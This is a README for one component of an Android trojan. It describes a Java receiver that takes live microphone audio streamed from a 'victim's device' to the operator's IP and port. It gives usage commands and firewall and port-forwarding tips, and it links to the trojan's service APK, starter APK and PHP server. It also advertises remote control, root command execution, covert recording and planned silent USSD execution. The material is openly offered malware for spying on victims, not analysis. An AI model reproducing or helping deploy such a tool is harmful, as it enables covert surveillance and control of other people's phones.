# Android Trojan (Built with Android SDK 22) source code
The main manual is here: https://github.com/androidtrojan1/android-trojan-service-
UPD. 11.02.2016 Version 1.2 released!

DESCRIPTION:



This is the source of executable .jar file that is used for recieving of sound stream from the mic of the victim's device in real time.
First you need to execute the command "stream [your_ip_address] [your_desired_listening_port]" and if it started it will show you
the neccessary buffer size and port that you should pass as argument.

Example of usage: 
java -jar streamer.jar bufsize port
for instance (java - jar streamer.jar 8192 31337)

IMPORTANT!!!
Dont forget to set up the firewall rule or just completely disable it for a while (the UDP port will be used for listening)
And you will also need to set up IP forwarding if you are bihind a firewall. 

HERE ARE LINKS TO THE OTHER COMPONENTS:

trojan service apk: https://github.com/androidtrojan1/android-trojan-service-

trojan starter apk : https://github.com/androidtrojan1/android-trojan-starter-

trojan php server part: https://github.com/androidtrojan1/android-trojan-php-server



Android trojan with abilities of remote control,root commands execution, recording and online sound streaming

Compatible with all Android from Gingerbread (API 10) up to Lollipop (API 22)





have fun!

Upd. 11.09.2016  New Update is coming. New features in the upcoming version:
*  Telegram real-time notifications about victim's actions
*  silent execution of ussd codes
*  more interesting root features ^^
